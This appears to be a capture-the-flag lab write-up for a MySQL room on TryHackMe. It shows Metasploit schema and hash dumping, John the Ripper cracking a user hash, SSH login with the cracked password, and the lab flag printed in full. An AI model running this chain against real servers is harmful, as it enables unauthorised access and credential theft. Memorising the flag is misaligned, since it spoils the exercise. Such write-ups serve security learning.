
### Details from the enumeration stage
username = root 
password = password
databases =  information_schema |mysql | performance_schema | sys |
Database Version: 5.7.29-0ubuntu0.18.04.1


1. searched and set to use mysql_schemadump
```shell
search mysql_schemadump
                                                                                                                    
Matching Modules                                                                                                    
================                                                                                                    
                                                                                                                    
   #  Name                                      Disclosure Date  Rank    Check  Description                         
   -  ----                                      ---------------  ----    -----  -----------                         
   0  auxiliary/scanner/mysql/mysql_schemadump                   normal  No     MYSQL Schema Dump                   
                                                                                                                    
                                                                                                                    
Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump  
                                                                                                                    
msf6 auxiliary(admin/mysql/mysql_sql) > info 0

       Name: MYSQL Schema Dump
     Module: auxiliary/scanner/mysql/mysql_schemadump
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  theLightCosine <theLightCosine@metasploit.com>

Check supported:
  No

Basic options:
  Name             Current Setting  Required  Description
  ----             ---------------  --------  -----------
  DISPLAY_RESULTS  true             yes       Display the Results to the Screen
  PASSWORD                          no        The password for the specified username
  RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasploit-framewo
                                              rk/wiki/Using-Metasploit
  RPORT            3306             yes       The target port (TCP)
  THREADS          1                yes       The number of concurrent threads (max one per host)
  USERNAME                          no        The username to authenticate as

Description:
  This module extracts the schema information from a MySQL DB server.

msf6 auxiliary(admin/mysql/mysql_sql) > use auxiliary/scanner/mysql/mysql_schemadump

```
Put in the necessary parameters and ran the exploit  got the last table name 
```shell
- TableName: x$waits_global_by_latency
    Columns:
    - ColumnName: events
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned

```

Used the mysql_hashdump auxiliary/scanner/mysql/mysql_hashdump. Ran the exploit and found the name carl which is not a default user
```shell
+] 10.10.93.56:3306      - Saving HashString as Loot: root:
[+] 10.10.93.56:3306      - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.93.56:3306      - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.93.56:3306      - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.93.56:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.93.56:3306      - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

Installed jack the ripper to crack the hashed passwords that were from in the hashdump

Ran the script and got the password doggie
```shell
john hash.txt               
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
doggie           (carl)     
1g 0:00:00:02 DONE 3/3 (2022-11-27 22:40) 0.3623g/s 828293p/s 828293c/s 828293C/s doggie..doggia
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

used the password to access ssh and got the flag
```shell
root㉿kali)-[/home/kali/Documents/network_services2]
└─# ssh carl@10.10.93.56 
The authenticity of host '10.10.93.56 (10.10.93.56)' can't be established.
ED25519 key fingerprint is SHA256:lzPSz2dnAUtAkM53Zn8G50umC6hWdyrSEcfYoFcGqF4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.56' (ED25519) to the list of known hosts.
carl@10.10.93.56's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov 28 03:42:54 UTC 2022

  System load:  0.0               Processes:           87
  Usage of /:   41.7% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.93.56
  Swap usage:   0%


23 packages can be updated.
0 updates are security updates.


Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
carl@polomysql:~$ ls
MySQL.txt
carl@polomysql:~$ cat MySQL.txt 
THM{congratulations_you_got_the_mySQL_flag}

```